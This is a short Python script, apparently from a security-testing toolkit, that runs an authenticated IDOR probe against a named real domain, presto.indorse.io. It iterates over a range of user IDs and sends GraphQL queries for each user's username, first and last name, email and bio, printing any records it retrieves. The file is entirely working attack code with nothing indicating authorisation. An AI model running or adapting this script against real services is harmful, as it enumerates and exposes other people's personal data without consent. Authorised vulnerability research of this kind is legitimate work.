import asyncio
from aura_auth import client, vault
from aura.ui.formatter import console

async def test_indorse_idor(start_id: int, end_id: int):
    domain = "presto.indorse.io"
    if not vault.get_session(domain):
        console.print(f"  [red][!] Error: No active session found for {domain}. Use 'aura_auth_cli.py add' first.[/red]")
        return

    console.print(f"[*] Starting Authenticated IDOR Probe on {domain} (IDs {start_id} to {end_id})...")
    
    for uid in range(start_id, end_id + 1):
        # We try a common GraphQL profile query
        query = {
            "query": "query { user(id: \"" + str(uid) + "\") { id username firstName lastName email bio } }"
        }
        
        url = f"https://{domain}/graphql"
        try:
            r = await client.request("POST", url, json=query)
            if r.status_code == 200:
                data = r.json()
                if "data" in data and data["data"].get("user"):
                    console.print(f"  [bold red][!!!] IDOR HIT: UID {uid}[/bold red]")
                    console.print(f"    -> Data: {data['data']['user']}")
                else:
                    # console.print(f"  [.] UID {uid} -> No data.")
                    pass
            elif r.status_code == 401:
                console.print(f"  [red][!] Session Expired/Unauthorized for UID {uid}.[/red]")
                break
        except Exception as e:
            # console.print(f"  [yellow][!] Error on UID {uid}: {e}[/yellow]")
            pass

if __name__ == "__main__":
    # Test range
    asyncio.run(test_indorse_idor(100, 150))
